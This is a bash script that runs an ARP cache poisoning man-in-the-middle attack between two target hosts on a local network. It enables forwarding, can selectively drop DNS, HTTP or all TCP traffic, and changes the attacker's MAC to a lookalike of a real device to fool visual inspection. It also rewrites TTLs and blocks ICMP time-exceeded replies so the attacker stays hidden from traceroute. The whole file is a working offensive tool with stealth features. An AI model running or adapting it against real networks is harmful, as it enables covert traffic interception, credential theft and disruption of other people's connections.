#!/bin/bash

#--------------------------------------------------
#
#  Configuration
#
#--------------------------------------------------

# Local device name eg. eth0 / wlo0 / etc...
DEVICE=""

# Target 1 address
IP1=""

# Target 2 address
IP2=""

# Target1 MAC address (Optional)
MAC1=""

# Target2 MAC address (Optional)
MAC2=""

# ARP cache poisoner command
SPOOF="acp -v -u -q -r 6000 -i $DEVICE $IP1 $IP2 $MAC1 $MAC2"

# A reconnect command that will reconnect after the
# interface is brought up.
#
# note: this has no effect if the local mac is not being changed
#
RECONNECT="systemctl restart NetworkManager.service"

# If not empty the local MAC will be changed. Values: "random" "lookalike" or ""
SPOOF_LOCAL_MAC="lookalike"

# If SPOOF_LOCAL_MAC is set to lookalike, the local MAC will be set
# to an address that resembles this one. This might guard agaist visual
# inspection, but automated tools won't be fooled.
LOCAL_LOOKALIKE_MAC="ex:am:pl:ea:dd:r0"

# Protocols that are *NOT* forwarded
declare -a no_forward

# Drop DNS
# no_forward+=("udp --dport 53")

# Drop HTTP
# no_forward+=("tcp --dport 80")

# Drop all TCP traffic
# no_forward+=("tcp")

#--------------------------------------------------
#
#  Save current settings
#
#--------------------------------------------------

MANGLE_RULES=`mktemp`
FILTER_RULES=`mktemp`
FORWARD=`cat /proc/sys/net/ipv4/ip_forward`
REDIRECT_SEND_ALL=`cat /proc/sys/net/ipv4/conf/all/send_redirects`
REDIRECT_SEND_DEV=`cat /proc/sys/net/ipv4/conf/$DEVICE/send_redirects`
REDIRECT_ACCEPT_ALL=`cat /proc/sys/net/ipv4/conf/all/accept_redirects`
REDIRECT_ACCEPT_DEV=`cat /proc/sys/net/ipv4/conf/$DEVICE/accept_redirects`

iptables-save -t mangle > $MANGLE_RULES
iptables-save -t filter > $FILTER_RULES


#--------------------------------------------------
#
#  Local MAC spoof
#
#--------------------------------------------------

wait_for_reconnect() {
    $RECONNECT
    IP_UP=`ip addr | grep "inet" | grep "24"`
    while [ -z "$IP_UP" ]; do
        sleep 1
        IP_UP=`ip addr | grep "inet" | grep "24"`
    done
}


set_mac() {
    ip link set $DEVICE down
    $1
    ip link set $DEVICE up
    wait_for_reconnect
}


set_mac_reversed_segment() {
    ADDR=$1
    C1=$2
    C2=$((C1 + 1))
    C3=$((C1 + 2))

    if ! [ "${ADDR:$C1:1}" == "${ADDR:$C2:1}" ]; then
        SUB=${ADDR:$C1:2}
        SUB_REV=`echo $SUB | rev`
        ADDR_REV="${ADDR:0:$C1}$SUB_REV${ADDR:$C3}"
        set_mac "macchanger --mac=$ADDR_REV $DEVICE"
        return 1
    fi
    return 0
}

# Alters the MAC address slighty so that it resembles an address of
# another real device
set_mac_to_lookalike() {
    ADDR=$1

    # Try to reverse a segment of the address to expliot the fact that
    # the order of letters in a word can be easily overlooked. (eg. "expliot" :)
    #
    # Only 4th and 5th segments are considered for reversal.
    # If the segments consist of identical numbers the reversal has no effect
    #
    # example: 30:f3:81:d3:90:05 -> 30:f3:81:3d:90:05
    #
    # This can fail if the segments consists of identical numbers
    for ((i = 9; i <= 12; i += 3))
    do
        set_mac_reversed_segment $ADDR $i
        FLIP=$?
        if [[ ( $FLIP == 1 ) ]]; then
            return
        fi
    done

    # If we got this far, reversing didn't work

    # Map visually similar characters
    declare -A lookalikes
    lookalikes=(["b"]="d" ["d"]="b" ["7"]="1" ["1"]="7"
                ["c"]="e" ["e"]="c" ["6"]="9" ["9"]="6"
                ["a"]="e" ["4"]="7" ["0"]="c" ["3"]="9"
                ["2"]="a" ["5"]="6" ["8"]="9" ["f"]="7")

    # Maps don't preserve order so we need a separate ordered sequence
    declare -a characters
    characters=("b" "d" "c" "e" "7" "1" "6" "9" "a" "4" "0" "3" "2" "5" "8" "f")

    # Vendor identifying numbers and the last two numbers are skipped
    SUBADDR=${ADDR:9:5}

    for i in "${characters[@]}"
    do
        rel_index=`expr index "$SUBADDR" $i`

        if [ $rel_index -ne 0 ]; then
            index=$((rel_index+9))
            new_mac=`echo $ADDR | sed s/./${lookalikes[$i]}/$index`
            set_mac "macchanger --mac=$new_mac $DEVICE"
            return
        fi
    done
}


if ! [ -z $SPOOF_LOCAL_MAC ]; then
    if [ $SPOOF_LOCAL_MAC == "random" ]; then
        set_mac "macchanger -A $DEVICE"
    fi
    if [ $SPOOF_LOCAL_MAC == "lookalike" ]; then
        set_mac_to_lookalike $LOCAL_LOOKALIKE_MAC
    fi
fi

#--------------------------------------------------
#
#  Routing setup
#
#--------------------------------------------------

iptables -t mangle -F

# Make sure we don't send out icmp redirects. We don't want to inform
# our targets that our route is not the most efficient one :)
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
echo 0 > /proc/sys/net/ipv4/conf/$DEVICE/send_redirects

# We also don't want to take any routing suggestions
echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects
echo 0 > /proc/sys/net/ipv4/conf/$DEVICE/accept_redirects

# enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Drop unforwarded protocols
for nf in "${no_forward[@]}"
do
    iptables -t filter -A FORWARD -p $nf -s $IP1 -j DROP
    iptables -t filter -A FORWARD -p $nf -s $IP2 -j DROP
done


# Hide from traceroute. This assumes a star topology.
#
# Traceroute T1 -> T2
# 2. T1   ->   router   ->   attacker   ->   router   ->   T2
#     ^           ^              ^             ^            ^
#   ttl=2     ttl=2-1=1     ttl=1+2-1=2     ttl=2-1=1   ttl=1-1=0
#
for ((i = 1; i <= 30; i++)) do
    iptables -t mangle -A PREROUTING -p udp -m ttl --ttl-eq $i -j TTL --ttl-set $((i+2));
done

iptables -t filter -A OUTPUT -p icmp --icmp-type 11 -j DROP

#--------------------------------------------------
#
#  Set cleanup on Ctrl-c
#
#--------------------------------------------------

CLEANED_UP=false


cleanup() {
    if ! $CLEANED_UP; then
        iptables-restore < $MANGLE_RULES
        iptables-restore < $FILTER_RULES

        echo $FORWARD > /proc/sys/net/ipv4/ip_forward
        echo $REDIRECT_ACCEPT_ALL > /proc/sys/net/ipv4/conf/all/accept_redirects
        echo $REDIRECT_ACCEPT_DEV > /proc/sys/net/ipv4/conf/$DEVICE/accept_redirects
        echo $REDIRECT_SEND_ALL > /proc/sys/net/ipv4/conf/all/send_redirects
        echo $REDIRECT_SEND_DEV > /proc/sys/net/ipv4/conf/$DEVICE/send_redirects

        rm $MANGLE_RULES
        rm $FILTER_RULES

        if [ "$SPOOF_LOCAL_MAC" ]; then
            set_mac "macchanger -p $DEVICE"
        fi

        CLEANED_UP=true
    fi
}

trap cleanup INT

#--------------------------------------------------
#
#  Run spoofer
#
#--------------------------------------------------

$SPOOF

cleanup
